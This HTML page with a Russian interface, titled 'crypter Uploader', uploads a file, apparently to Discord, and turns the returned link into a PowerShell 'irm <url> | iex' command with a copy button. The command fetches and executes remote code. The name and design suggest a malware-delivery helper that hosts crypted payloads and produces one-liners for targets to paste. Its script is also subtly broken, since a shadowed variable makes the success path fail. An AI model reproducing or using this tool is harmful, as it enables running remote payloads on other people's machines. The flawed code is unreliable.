<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>crypter Uploader</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 600px;
            width: 100%;
        }
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .upload-area {
            border: 3px dashed #667eea;
            border-radius: 15px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #f8f9ff;
        }
        .upload-area:hover {
            background: #eef1ff;
            border-color: #764ba2;
        }
        .upload-area.dragover {
            background: #e0e7ff;
            border-color: #764ba2;
        }
        .upload-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        .upload-text {
            color: #666;
            font-size: 16px;
        }
        .upload-text span {
            color: #667eea;
            font-weight: bold;
        }
        #fileInput {
            display: none;
        }
        .file-info {
            margin-top: 20px;
            padding: 15px;
            background: #f0f0f0;
            border-radius: 10px;
            display: none;
        }
        .file-info.show {
            display: block;
        }
        .file-name {
            font-weight: bold;
            color: #333;
            word-break: break-all;
        }
        .upload-btn {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
            display: none;
        }
        .upload-btn:hover {
            transform: translateY(-2px);
        }
        .upload-btn.show {
            display: block;
        }
        .upload-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .result {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9ff;
            border-radius: 15px;
            border-left: 4px solid #667eea;
            display: none;
        }
        .result.show {
            display: block;
        }
        .result-label {
            font-weight: bold;
            color: #667eea;
            margin-bottom: 10px;
            display: block;
        }
        .powershell-cmd {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            word-break: break-all;
            position: relative;
            cursor: pointer;
        }
        .powershell-cmd:hover {
            background: #2d2d2d;
        }
        .powershell-cmd::after {
            content: 'Кликни чтобы скопировать';
            position: absolute;
            top: 5px;
            right: 10px;
            font-size: 10px;
            color: #888;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .powershell-cmd:hover::after {
            opacity: 1;
        }
        .copied {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #4caf50;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            font-weight: bold;
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 1000;
        }
        .copied.show {
            opacity: 1;
        }
        .progress {
            margin-top: 20px;
            height: 6px;
            background: #e0e0e0;
            border-radius: 3px;
            overflow: hidden;
            display: none;
        }
        .progress.show {
            display: block;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
        }
        .status {
            text-align: center;
            margin-top: 10px;
            color: #666;
            font-size: 14px;
            display: none;
        }
        .status.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📤 crypter Uploader</h1>
        
        <div class="upload-area" id="uploadArea">
            <div class="upload-icon">📁</div>
            <div class="upload-text">
                Перетащи файл сюда или <span>кликни для выбора</span>
            </div>
        </div>
        
        <input type="file" id="fileInput">
        
        <div class="file-info" id="fileInfo">
            <div class="file-name" id="fileName"></div>
            <div id="fileSize"></div>
        </div>
        
        <button class="upload-btn" id="uploadBtn">Загрузить на crypter</button>
        
        <div class="progress" id="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status" id="status"></div>
        
        <div class="result" id="result">
            <span class="result-label">PowerShell команда для скачивания:</span>
            <div class="powershell-cmd" id="powershellCmd"></div>
        </div>
    </div>
    
    <div class="copied" id="copied">Скопировано!</div>

    <script>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const fileInfo = document.getElementById('fileInfo');
        const fileName = document.getElementById('fileName');
        const fileSize = document.getElementById('fileSize');
        const uploadBtn = document.getElementById('uploadBtn');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');
        const status = document.getElementById('status');
        const result = document.getElementById('result');
        const powershellCmd = document.getElementById('powershellCmd');
        const copied = document.getElementById('copied');

        let selectedFile = null;

        uploadArea.addEventListener('click', () => fileInput.click());
        
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        
        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragover');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFile(files[0]);
            }
        });

        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFile(e.target.files[0]);
            }
        });

        function handleFile(file) {
            selectedFile = file;
            fileName.textContent = file.name;
            fileSize.textContent = formatFileSize(file.size);
            fileInfo.classList.add('show');
            uploadBtn.classList.add('show');
            result.classList.remove('show');
        }

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        uploadBtn.addEventListener('click', async () => {
            if (!selectedFile) return;

            uploadBtn.disabled = true;
            progress.classList.add('show');
            status.classList.add('show');
            result.classList.remove('show');

            const formData = new FormData();
            formData.append('reqtype', 'fileupload');
            formData.append('fileToUpload', selectedFile);

            try {
                status.textContent = 'Загрузка на Discord...';
                progressBar.style.width = '50%';

                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });

                progressBar.style.width = '100%';

                if (!response.ok) {
                    throw new Error('Ошибка загрузки');
                }

                const result = await response.json();
                
                if (!result.success || !result.url.startsWith('http')) {
                    throw new Error('Ошибка от сервера: ' + (result.error || 'Unknown error'));
                }
                
                const fileUrl = result.url;

                const cmd = `irm ${fileUrl} | iex`;
                
                powershellCmd.textContent = cmd;
                result.classList.add('show');
                status.textContent = 'Готово!';

            } catch (error) {
                status.textContent = 'Ошибка: ' + error.message;
                status.style.color = '#e74c3c';
            } finally {
                uploadBtn.disabled = false;
            }
        });

        powershellCmd.addEventListener('click', () => {
            navigator.clipboard.writeText(powershellCmd.textContent).then(() => {
                copied.classList.add('show');
                setTimeout(() => copied.classList.remove('show'), 2000);
            });
        });
    </script>
</body>
</html>
